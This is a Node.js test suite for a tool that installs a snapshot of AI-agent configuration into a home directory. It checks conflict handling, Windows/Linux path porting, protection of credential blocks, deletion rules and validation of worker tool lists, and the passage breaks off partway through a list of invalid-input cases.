// Self-check for install-user.mjs: node install-user.test.mjs
// Hermetic: the data repo (with user/ snapshot) and a copy of the tool script live in a temp dir.
// Offline by design: every invocation uses --skip-plugins.
// The examples/data install workflow also skips plugins; neither proves Bun installation.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, copyFileSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, realpathSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { delimiter, dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { fingerprint, forAll, forTarget, keepTemp, nextLayerCounter, remapHomePaths, sameContent } from './lib/data.mjs';
import { BREAK_UI_BASELINE, BREAK_UI_SKILL_MD } from './install-user.fixtures.mjs';

const tmp = mkdtempSync(join(tmpdir(), 'alate-install-'));
const scriptDir = join(tmp, 'tool'); // copy of the script + lib, so the default ../agent-data fallback misses
const data = join(tmp, 'data');
const home = join(tmp, 'home');
mkdirSync(join(scriptDir, 'lib'), { recursive: true });
copyFileSync(fileURLToPath(new URL('./install-user.mjs', import.meta.url)), join(scriptDir, 'install-user.mjs'));
copyFileSync(fileURLToPath(new URL('./lib/data.mjs', import.meta.url)), join(scriptDir, 'lib', 'data.mjs'));
// Layer mode spawns the real sync.mjs beside the script for the rules install.
copyFileSync(fileURLToPath(new URL('./sync.mjs', import.meta.url)), join(scriptDir, 'sync.mjs'));
const put = (rel, text) => { mkdirSync(join(data, 'user', rel, '..'), { recursive: true }); writeFileSync(join(data, 'user', rel), text); };
const run = (extra, h = home, env) => spawnSync(process.execPath, [join(scriptDir, 'install-user.mjs'), '--home', h, ...extra], {
  encoding: 'utf8',
  // Default env puts the stub skillspector first on PATH (the scan gate) and points
  // SKILLSPECTOR_VENV at a path that does not exist, so the run resolves the PATH stub; an
  // explicit env runs without either. Windows cannot exec an extensionless stub through
  // spawnSync, so there the suite needs a real skillspector: the gate fails closed without
  // one, by design.
  env: env ?? (scanned ? { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv') } : undefined),
});
// The stub logs its scan argv and exits with a script-set code: 0 clean, 1 findings. A
// --version probe is answered but not logged: install-user probes the version once per run
// before it scans, and the log stays a scan-only record.
const stubDir = join(tmp, 'stub');
const callsLog = join(stubDir, 'calls.log');
const scanned = process.platform !== 'win32';
const writeStub = (exit, version = 'SkillSpector v2.13.0') => {
  writeFileSync(join(stubDir, 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${callsLog}'\nif [ "$1" = "--version" ]; then echo '${version}'; exit 0; fi\nexit ${exit}\n`);
  chmodSync(join(stubDir, 'skillspector'), 0o755);
};
if (scanned) {
  mkdirSync(stubDir, { recursive: true });
  writeStub(0);
}
// Mirrors install-user's resolution: the pinned venv, then PATH, and a probe must report the
// pin. Returns the binary or null; the real-skillspector checks skip without one.
const discoverRealScanner = () => {
  const venv = process.env.SKILLSPECTOR_VENV ?? join(homedir(), '.cache', 'skillspector-venv');
  const candidates = [
    join(venv, process.platform === 'win32' ? join('Scripts', 'skillspector.exe') : join('bin', 'skillspector')),
    ...(process.env.PATH ?? '').split(delimiter).map(dir => join(dir, process.platform === 'win32' ? 'skillspector.exe' : 'skillspector')),
  ];
  for (const candidate of candidates) {
    const probe = spawnSync(candidate, ['--version'], { encoding: 'utf8' });
    if (probe.status === 0 && String(probe.stdout).trim() === 'SkillSpector v2.13.0') return candidate;
  }
  return null;
};
const got = rel => readFileSync(join(home, rel), 'utf8');

try {
  // Missing data dir: no --data, fallback ../agent-data beside scriptDir does not exist.
  let r = run(['--skip-plugins']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /No data dir|--data|--repo/);

  // Missing user/ snapshot in an existing data dir.
  mkdirSync(data, { recursive: true });
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /No user\/ snapshot/);
  assert.ok(r.stderr.includes(data), r.stderr);

  put('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
  put('omp/agent/skills/mine/SKILL.md', '# mine\n');
  put('omp/plugins/package.json', '{"dependencies":{}}\n');
  put('omp/plugins/bun.lock', '{}\n');
  put('agents/.skill-lock.json', '{"skills":{}}\n');
  put('agents/skills/theirs/SKILL.md', '# theirs\n');

  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /6 installed, 0 unchanged/);
  assert.equal(got('.omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{}}\n', 'the first dot is restored');
  assert.ok(existsSync(join(home, '.omp/agent/skills/mine/SKILL.md')), 'nested dirs are created');
  assert.match(r.stdout, /plugins skipped/);

  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 6 unchanged/, 'a rerun copies nothing');

  // A CRLF copy of the same bytes counts as unchanged, so autocrlf checkouts never churn a live home.
  mkdirSync(join(home, '.agents/skills/theirs'), { recursive: true });
  writeFileSync(join(home, '.agents/skills/theirs/SKILL.md'), '# theirs\r\n');
  r = run(['--data', data, '--skip-plugins']);
  assert.match(r.stdout, /0 installed, 6 unchanged/);
  assert.equal(got('.agents/skills/theirs/SKILL.md'), '# theirs\r\n', 'line-ending-only drift is not rewritten');

  const live = '# mine, edited on the machine\n';
  writeFileSync(join(home, '.omp/agent/skills/mine/SKILL.md'), live);
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'a differing live file is refused');
  assert.ok(r.stderr.includes(join(home, '.omp/agent/skills/mine/SKILL.md')), r.stderr);
  assert.equal(got('.omp/agent/skills/mine/SKILL.md'), live, 'refusal leaves the machine file alone');

  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(got('.omp/agent/skills/mine/SKILL.md'), '# mine\n', '--force restores the snapshot');

  // alate remembers what it installed: a newer snapshot replaces a file nobody changed since...
  const mine = '.omp/agent/skills/mine/SKILL.md';
  put('omp/agent/skills/mine/SKILL.md', '# mine, v2\n');
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, `an untouched install takes the newer snapshot: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 5 unchanged/);
  assert.equal(got(mine), '# mine, v2\n');
  // ...but not one changed on the machine since,
  writeFileSync(join(home, mine), live);
  put('omp/agent/skills/mine/SKILL.md', '# mine, v3\n');
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'a file changed after the install is refused');
  assert.match(r.stderr, /commit the change to the data repo/);
  assert.equal(got(mine), live);
  // ...nor one it cannot vouch for: an unreadable record proves nothing.
  r = run(['--data', data, '--force', '--skip-plugins']);
  writeFileSync(join(home, '.alate/installed.json'), '{');
  put('omp/agent/skills/mine/SKILL.md', '# mine, v4\n');
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'an unreadable record never licenses an overwrite');
  assert.match(r.stderr, /Ignoring unreadable/);
  assert.equal(got(mine), '# mine, v3\n');
  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.ok(JSON.parse(got('.alate/installed.json'))['omp/agent/skills/mine/SKILL.md'], '--force writes a fresh record');

  // Snapshots come from Windows; workers and CI run Linux. There, paths into the captured layer
  // follow the home (a Windows catalog path became a junk file in each worktree), a cmd /c wrapper
  // goes (npx runs directly), MCP servers that still only run on Windows are disabled and named, not
  // left to fail on every start, and chrome-devtools-mcp gets what Chrome needs in a root container.
  const mcp = {
    mcpServers: {
      devtools: { command: 'cmd', args: ['/c', 'npx', '-y', 'chrome-devtools-mcp@latest', '--isolated'] },
      wrapped: { command: 'cmd', args: ['/c', 'npx', '-y', 'some-mcp'] },
      plugin: { command: 'node', args: ['C:\\Users\\me\\.omp\\plugins\\node_modules\\x\\server.mjs'] },
      native: { command: 'npx', env: { TOOL: 'C:\\Users\\me\\scoop\\shims\\tool.exe', KEEP: 'yes' } },
      exe: { command: 'C:\\tools\\srv.exe' },
      shell: { command: 'cmd.exe', args: ['/d', '/c', 'npx -y spaced-mcp'] },
      web: { type: 'http', url: 'https://example.com/mcp' },
    },
    disabledServers: ['old'],
  };
  const raw = Buffer.from(JSON.stringify(mcp));
  const linux = { home: '/home/u', platform: 'linux', roots: new Set(['.omp', '.agents']) };
  let t = forTarget('omp/agent/mcp.json', raw, linux);
  const doc = JSON.parse(t.bytes);
  assert.deepEqual(doc.mcpServers.plugin.args, ['/home/u/.omp/plugins/node_modules/x/server.mjs']);
  assert.deepEqual(doc.mcpServers.wrapped, { command: 'npx', args: ['-y', 'some-mcp'] }, 'cmd /c goes, the program runs');
  assert.deepEqual(doc.mcpServers.devtools.args, ['-y', 'chrome-devtools-mcp@latest', '--isolated', '--headless', '--chrome-arg=--no-sandbox'],
    'chrome-devtools-mcp runs headless, isolated and without the sandbox; a flag it already has is not repeated');
  assert.deepEqual(doc.mcpServers.native.env, { KEEP: 'yes' }, 'only the Windows path is dropped');
  assert.deepEqual(doc.disabledServers, ['exe', 'old', 'shell']);
  assert.deepEqual(doc.mcpServers.shell, mcp.mcpServers.shell, 'a disabled server keeps its config');
  assert.deepEqual(doc.mcpServers.web, mcp.mcpServers.web);
  assert.equal(t.notes.length, 7, t.notes.join('\n'));
  assert.ok(t.notes.some(n => n.includes('MCP server shell runs through cmd.exe')), t.notes.join('\n'));
  assert.ok(t.notes.some(n => n.includes('MCP server exe runs through C:\\tools\\srv.exe')), t.notes.join('\n'));
  t = forTarget('omp/agent/mcp.json', raw, { ...linux, platform: 'win32' });
  assert.equal(t.bytes, raw, 'a Windows target gets the captured bytes');
  assert.deepEqual(t.notes, []);
  t = forTarget('omp/marketplaces.json', Buffer.from(JSON.stringify({ marketplaces: [{ catalogPath: 'C:\\Users\\me\\.omp\\plugins\\cache\\marketplaces\\m\\marketplace.json' }] })), linux);
  assert.equal(JSON.parse(t.bytes).marketplaces[0].catalogPath, '/home/u/.omp/plugins/cache/marketplaces/m/marketplace.json');
  const elsewhere = Buffer.from(JSON.stringify({ source: 'C:\\Users\\me\\skills\\x\\SKILL.md' }));
  t = forTarget('agents/skills/x/meta.json', elsewhere, linux);
  assert.equal(t.bytes, elsewhere, 'a path outside the layer has no target: installed as captured');
  assert.deepEqual(t.notes, []);

  // Mirror direction: a Linux worker capture holds POSIX absolute paths, and a Windows target
  // roots them at its own home with Windows separators. Only paths through a layer root move.
  const winTarget = { home: 'C:\\Users\\me', platform: 'win32', roots: new Set(['.omp', '.agents']) };
  const captured = Buffer.from(JSON.stringify({ marketplaces: [{ catalogPath: '/root/.omp/plugins/cache/marketplaces/m/marketplace.json' }] }));
  t = forTarget('omp/marketplaces.json', captured, winTarget);
  assert.equal(JSON.parse(t.bytes).marketplaces[0].catalogPath, 'C:\\Users\\me\\.omp\\plugins\\cache\\marketplaces\\m\\marketplace.json');
  assert.deepEqual(t.notes, ['omp/marketplaces.json: 1 POSIX path(s) now point into C:\\Users\\me']);
  const usr = Buffer.from(JSON.stringify({ node: '/usr/bin/node' }));
  t = forTarget('omp/agent/x.json', usr, winTarget);
  assert.equal(t.bytes, usr, 'a POSIX path outside the layer roots stays as captured');
  assert.deepEqual(t.notes, []);
  // The conflict compare rides on the ported form: what install writes differs from the
  // captured bytes, so a compare that skipped the port would turn every rerun into a conflict.
  assert.ok(!sameContent('omp/marketplaces.json', t.bytes, captured), 'the ported bytes differ from the captured ones');
  assert.ok(sameContent('omp/marketplaces.json', t.bytes, t.bytes), 'a machine copy of the ported form is unchanged');

  // Property: a ported path always lands inside the target home, and porting the ported form
  // changes nothing. '..' stays out of the generator: a real capture never carries it, and a
  // join above the home would legitimately leave the home prefix.
  const SEG = ['root', 'home', 'u', 'dom', 'usr', 'bin', 'plugins', 'cache', 'm', 'x', 'skills'];
  const absPath = rand => {
    let p = '';
    for (let i = 0, n = Math.floor(rand() * 3); i < n; i++) p += `/${SEG[Math.floor(rand() * SEG.length)]}`;
    const rootsList = [...winTarget.roots];
    p += rand() < 0.7 ? `/${rootsList[Math.floor(rand() * rootsList.length)]}` : `/${SEG[Math.floor(rand() * SEG.length)]}`;
    for (let i = 0, n = Math.floor(rand() * 3); i < n; i++) p += `/${SEG[Math.floor(rand() * SEG.length)]}`;
    return p;
  };
  forAll(rand => {
    const doc = {};
    for (let i = 0, n = 1 + Math.floor(rand() * 3); i < n; i++) doc[`k${i}`] = rand() < 0.6 ? absPath(rand) : SEG[Math.floor(rand() * SEG.length)];
    return doc;
  }, doc => {
    const first = forTarget('omp/agent/prop.json', Buffer.from(JSON.stringify(doc)), winTarget);
    const out = JSON.parse(first.bytes);
    for (const [k, v] of Object.entries(doc)) {
      if (out[k] === v) continue;
      assert.ok(String(out[k]).startsWith(winTarget.home), `a moved value stays inside the target home: ${v} -> ${out[k]}`);
    }
    const again = forTarget('omp/agent/prop.json', first.bytes, winTarget);
    assert.deepEqual(JSON.parse(again.bytes), out, 'porting the ported form changes nothing');
    assert.deepEqual(again.notes, [], 'the second port moves nothing');
  });

  // install-user applies it for the machine it runs on.
  put('omp/agent/mcp.json', `${JSON.stringify(mcp, null, 2)}\n`);
  const linuxHome = join(tmp, 'linux-home');
  r = run(['--data', data, '--skip-plugins'], linuxHome);
  assert.equal(r.status, 0, r.stderr);
  const installed = JSON.parse(readFileSync(join(linuxHome, '.omp/agent/mcp.json'), 'utf8'));
  if (process.platform === 'win32') assert.deepEqual(installed, mcp);
  else {
    assert.deepEqual(installed.disabledServers, ['exe', 'old', 'shell']);
    assert.equal(installed.mcpServers.wrapped.command, 'npx');
    assert.match(r.stdout, /MCP server wrapped runs npx directly, without cmd \/c/);
    r = run(['--data', data, '--skip-plugins'], linuxHome);
    assert.match(r.stdout, /0 installed, 7 unchanged/, 'an adapted file counts as unchanged on the rerun');
  }

  // omp stamps updatedAt on each catalog refresh: that drift alone is no conflict, a changed path is.
  const registry = stamp => `${JSON.stringify({ version: 1, marketplaces: [{ name: 'm', catalogPath: '/x/marketplace.json', updatedAt: stamp }] }, null, 2)}\n`;
  put('omp/marketplaces.json', registry('2026-01-01T00:00:00.000Z'));
  const regHome = join(tmp, 'registry-home');
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 0, r.stderr);
  writeFileSync(join(regHome, '.omp/marketplaces.json'), registry('2026-10-09T17:41:01.581Z'));
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 0, `a refresh stamp alone is no conflict: ${r.stderr}`);
  writeFileSync(join(regHome, '.omp/marketplaces.json'), registry('2026-10-09T17:41:01.581Z').replace('/x/', '/y/'));
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 1, 'a changed catalog path still is');

  // On a Windows machine, the Linux worker capture's POSIX catalog path installs ported into
  // the Windows home, and the rerun counts the file unchanged without --force: the compare
  // saw the ported form (the stray C:\root folder this prevents is cleaned by hand).
  if (process.platform === 'win32') {
    put('omp/marketplaces.json', `${JSON.stringify({ version: 1, marketplaces: [{ name: 'm', catalogPath: '/root/.omp/plugins/cache/marketplaces/m/marketplace.json' }] }, null, 2)}\n`);
    const winHome = join(tmp, 'win-home');
    r = run(['--data', data, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, r.stderr);
    const winRegistry = JSON.parse(readFileSync(join(winHome, '.omp/marketplaces.json'), 'utf8'));
    assert.equal(winRegistry.marketplaces[0].catalogPath,
      join(winHome, '.omp', 'plugins', 'cache', 'marketplaces', 'm', 'marketplace.json'),
      'the captured POSIX path installs rooted at the Windows home');
    r = run(['--data', data, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, `the ported install is unchanged on the rerun: ${r.stderr}`);
    assert.match(r.stdout, /0 installed, \d+ unchanged/, 'the rerun installs nothing, so no --force is needed');
    assert.ok(!existsSync(join('C:', 'root')), 'nothing writes the captured prefix as a Windows folder');
  }

  // Deployment settings stay on the target: the snapshot's config.yml carries no top-level
  // hindsight:/alate: blocks (capture drops them), and the machine's own ride along on every
  // install. A config that differs only in those blocks is unchanged, a snapshot change keeps
  // them byte for byte, and a change outside them is still a conflict. The blocks hold
  // credentials: they never reach stdout or stderr.
  const blocks = 'hindsight:\n  apiUrl: http://nas:8888\n  apiToken: $HINDSIGHT_TOKEN\nalate:\n  branch: main\n';
  const depHome = join(tmp, 'dep-home');
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 0, r.stderr);
  const depConfig = join(depHome, '.omp/agent/config.yml');
  const snapshotConfig = readFileSync(join(data, 'user/omp/agent/config.yml'), 'utf8');
  writeFileSync(depConfig, snapshotConfig + blocks);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.match(r.stdout, /0 installed, 8 unchanged/, `only deployment blocks differ: ${r.stderr}`);
  assert.equal(readFileSync(depConfig, 'utf8'), snapshotConfig + blocks, 'unchanged leaves the blocks byte for byte');

  // A snapshot change installs and keeps the target's deployment blocks byte for byte,
  // recording the snapshot's fingerprint so the next rerun is unchanged again.
  const v2 = 'modelRoles:\n  default: zai/glm-5.3\n';
  put('omp/agent/config.yml', v2);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 0, `a snapshot change takes the deployment blocks along: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 7 unchanged/);
  assert.equal(readFileSync(depConfig, 'utf8'), v2 + blocks, 'the blocks survive the install byte for byte');
  assert.equal(JSON.parse(readFileSync(join(depHome, '.alate/installed.json'), 'utf8'))['omp/agent/config.yml'],
    fingerprint('omp/agent/config.yml', Buffer.from(v2)), 'the record holds the snapshot fingerprint');
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.match(r.stdout, /0 installed, 8 unchanged/, 'the recorded fingerprint makes the rerun unchanged');

  // A change outside the deployment blocks that is neither the snapshot nor the last install
  // is still a conflict, and the block content never reaches the output.
  const edited = v2.replace('zai/glm-5.3', 'zai/glm-edited') + blocks;
  writeFileSync(depConfig, edited);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 1, 'a machine change outside the blocks is refused');
  assert.ok(r.stderr.includes(join(depHome, '.omp/agent/config.yml')), r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), edited, 'refusal leaves the machine file alone');
  assert.ok(!`${r.stdout}${r.stderr}`.includes('apiToken') && !`${r.stdout}${r.stderr}`.includes('nas:8888'),
    'deployment block content is never printed');

  // --force overrides the conflict but still keeps the deployment blocks.
  r = run(['--data', data, '--force', '--skip-plugins'], depHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), v2 + blocks, '--force keeps the blocks too');

  // A top-level line that only mentions hindsight is content, not a block start: with it the
  // machine file differs outside the deployment blocks, so it is still a conflict.
  const noted = v2 + 'note: "mentions hindsight: often"\n' + blocks;
  writeFileSync(depConfig, noted);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 1, 'a top-level hindsight mention outside the blocks is still a conflict');
  assert.ok(r.stderr.includes(join(depHome, '.omp/agent/config.yml')), r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), noted, 'refusal leaves the machine file alone');

  // A deployment block that ends the file without a final newline still matches the snapshot.
  const dep2Home = join(tmp, 'dep2-home');
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.equal(r.status, 0, r.stderr);
  writeFileSync(join(dep2Home, '.omp/agent/config.yml'), v2 + 'hindsight:\n  apiUrl: http://nas:8888');
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.match(r.stdout, /0 installed, 8 unchanged/, `an unterminated block still matches the snapshot: ${r.stderr}`);

  // A snapshot without a final newline still gets the blocks on their own line.
  const v3 = 'modelRoles:\n  default: zai/glm-4';
  put('omp/agent/config.yml', v3);
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.equal(r.status, 0, `an unterminated snapshot takes the blocks along: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 7 unchanged/);
  assert.equal(readFileSync(join(dep2Home, '.omp/agent/config.yml'), 'utf8'),
    `${v3}\nhindsight:\n  apiUrl: http://nas:8888`, 'the merge adds the missing terminator');

  // Ottr's per-project package lists come from the data repo only: a changed list replaces the copy.
  mkdirSync(join(data, 'workers', 'web'), { recursive: true });
  writeFileSync(join(data, 'workers', 'web', 'apt.txt'), 'libnss3\n');
  mkdirSync(join(data, 'workers', 'nolist'), { recursive: true });
  const listHome = join(tmp, 'list-home');
  r = run(['--data', data, '--skip-plugins'], listHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(listHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\n');
  assert.ok(!existsSync(join(listHome, '.ottr/workers/nolist')), 'a project without a list gets nothing');
  writeFileSync(join(data, 'workers', 'web', 'apt.txt'), 'libnss3\nfonts-liberation\n');
  r = run(['--data', data, '--skip-plugins'], listHome);
  assert.equal(r.status, 0, `a changed list is no conflict: ${r.stderr}`);
  assert.equal(readFileSync(join(listHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\nfonts-liberation\n');

  // A dropped file is deleted when it still holds what alate installed, its record goes,
  // and a rename lands as one install plus one delete in a single run.
  // Bring `home` up to the current snapshot first: the sections above changed config.yml,
  // mcp.json, marketplaces.json and the worker list in other homes, so this home has drifted.
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/agent/skills/mine/SKILL.md'));
  const renamed = '# mine, v5\n'; // hoisted so the zero-deps import scan (keyword + quote) never matches
  put('omp/agent/skills/mine/RENAME.md', renamed);
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /1 installed, 8 unchanged, 1 deleted/);
  assert.match(r.stdout, /deleted  \.omp[/\\]agent[/\\]skills[/\\]mine[/\\]SKILL\.md/);
  assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/SKILL.md')));
  assert.equal(got('.omp/agent/skills/mine/RENAME.md'), renamed);
  const record = JSON.parse(got('.alate/installed.json'));
  assert.ok(!('omp/agent/skills/mine/SKILL.md' in record), 'the dropped file\'s record is gone');
  assert.equal(record['omp/agent/skills/mine/RENAME.md'], fingerprint('omp/agent/skills/mine/RENAME.md', Buffer.from(renamed)));
  assert.ok(existsSync(join(home, '.omp/agent/skills/mine')), 'the folder with a surviving file stays');

  // A skill folder the snapshot drops completely goes with its empty directories.
  rmSync(join(data, 'user/agents/skills/theirs'), { recursive: true });
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 8 unchanged, 1 deleted/);
  assert.ok(!existsSync(join(home, '.agents/skills/theirs')));
  assert.ok(existsSync(join(home, '.agents/.skill-lock.json')), 'sibling files stay');
  assert.ok(existsSync(join(home, '.agents')), 'the mapped root stays');

  // A dropped file that changed on this machine stays, loses its record, prints a note,
  // and --force does not delete it either.
  writeFileSync(join(home, '.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n');
  rmSync(join(data, 'user/agents/.skill-lock.json'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, 'a changed dropped file never fails the run');
  assert.match(r.stdout, /0 installed, 7 unchanged, 0 deleted/);
  assert.ok(r.stdout.includes('changed here, kept: '));
  assert.ok(r.stdout.includes(join(home, '.agents/.skill-lock.json')), r.stdout);
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n', 'machine state wins');
  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n', '--force does not delete a changed file');

  // A symlink at a dropped path refuses the whole run before anything is deleted.
  // Windows needs privileges for file symlinks, so the link fixture runs on POSIX only;
  // the refusal behavior itself is covered on Linux CI. The snapshot deletions below
  // feed the later sections, so they run on every platform.
  const dropHome = join(tmp, 'drop-home');
  r = run(['--data', data, '--skip-plugins'], dropHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/marketplaces.json'));
  rmSync(join(data, 'user/omp/plugins/bun.lock'));
  if (process.platform !== 'win32') {
    rmSync(join(dropHome, '.omp/marketplaces.json'));
    symlinkSync(join(dropHome, '.omp/plugins/bun.lock'), join(dropHome, '.omp/marketplaces.json'));
    r = run(['--data', data, '--skip-plugins'], dropHome);
    assert.equal(r.status, 1, 'a link at a dropped path is refused');
    assert.ok(existsSync(join(dropHome, '.omp/plugins/bun.lock')), 'nothing is deleted');
    assert.ok(existsSync(join(dropHome, '.omp/marketplaces.json')));
  }

  // A home without installed.json loses nothing: an unrecorded dropped file just stays.
  const bareHome = join(tmp, 'bare-home');
  r = run(['--data', data, '--skip-plugins'], bareHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/agent/mcp.json'));
  rmSync(join(bareHome, '.alate'), { recursive: true });
  r = run(['--data', data, '--skip-plugins'], bareHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 4 unchanged, 0 deleted/);
  assert.ok(existsSync(join(bareHome, '.omp/agent/mcp.json')), 'no record, no deletion');

  // A worker list the data repo no longer ships is deleted, with its empty directories.
  const workerHome = join(tmp, 'worker-home');
  r = run(['--data', data, '--skip-plugins'], workerHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'workers/web/apt.txt'));
  r = run(['--data', data, '--skip-plugins'], workerHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 3 unchanged, 1 deleted/);
  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]apt\.txt/);
  assert.ok(!existsSync(join(workerHome, '.ottr/workers')), 'empty worker dirs are pruned');
  assert.ok(existsSync(join(workerHome, '.ottr')), 'the root stays');

  // Worker additions: tools.json and env.txt provision beside apt.txt with the same replace and
  // delete rules, workers/_all/ provisions like a project, and both files are validated before
  // anything is written: an invalid file fails the provision with its path, nothing lands.
  const SHA = 'cadd3204e728a35d3f13adb7fd0d7902636b79f6b95c40c265eb73b6c35329e4';
  const godot = { name: 'godot', url: 'https://example.com/godot.zip', sha256: SHA, unpack: 'zip', bin: 'Godot_v4.7.2-stable_linux.x86_64' };
  const fleet = { name: 'fleet-tool', url: 'https://example.com/fleet-tool', sha256: SHA.split('').reverse().join(''), unpack: 'none' };
  const toolsJson = entries => `${JSON.stringify(entries, null, 2)}\n`;
  const putWorker = (project, file, text) => {
    mkdirSync(join(data, 'workers', project), { recursive: true });
    writeFileSync(join(data, 'workers', project, file), text);
  };
  putWorker('web', 'apt.txt', 'libnss3\n');
  putWorker('web', 'tools.json', toolsJson([godot]));
  putWorker('web', 'env.txt', '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
  putWorker('_all', 'tools.json', toolsJson([fleet]));
  putWorker('_all', 'env.txt', 'SHARED_TOKEN\n');
  const toolsHome = join(tmp, 'tools-home');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\n');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/tools.json'), 'utf8'), toolsJson([godot]));
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/tools.json'), 'utf8'), toolsJson([fleet]), '_all provisions like a project');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/env.txt'), 'utf8'), 'SHARED_TOKEN\n');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.match(r.stdout, /0 installed, 8 unchanged/, 'a rerun copies nothing');

  // The replace rule: a changed list is no conflict, the machine copy just takes the new bytes.
  putWorker('web', 'env.txt', 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, `a changed list is no conflict: ${r.stderr}`);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');

  // The delete rule: a list the data repo drops is deleted, its siblings and the fleet folder stay.
  rmSync(join(data, 'workers/web/env.txt'));
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]env\.txt/);
  assert.ok(!existsSync(join(toolsHome, '.ottr/workers/web/env.txt')));
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/web/apt.txt')), 'sibling lists stay');
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/_all/env.txt')), 'the fleet folder stays');

  // Every rule break refuses the whole provision with the file path, and nothing is written —
  // not even the valid apt.txt beside the broken file in the same folder.
  const breaks = [
    ['a bad tool name', 'web/tools.json', toolsJson([{ ...godot, name: 'Godot' }])],
    ['a duplicate tool name', 'web/tools.json', toolsJson([godot, godot])],
    ['a bad sha256', 'web/tools.json', toolsJson([{ ...godot, sha256: SHA.toUpperCase() }])],
    ['an http:// url', 'web/tools.json', toolsJson([{ ...godot, url: 'http://example.com/godot.zip' }])],
    ['a ".." in bin', 'web/tools.json', toolsJson([{ ...godot, bin: '../godot' }])],
    ['an unknown key', 'web/tools.json', toolsJson([{ ...godot, post_install: 'echo hi' }])],
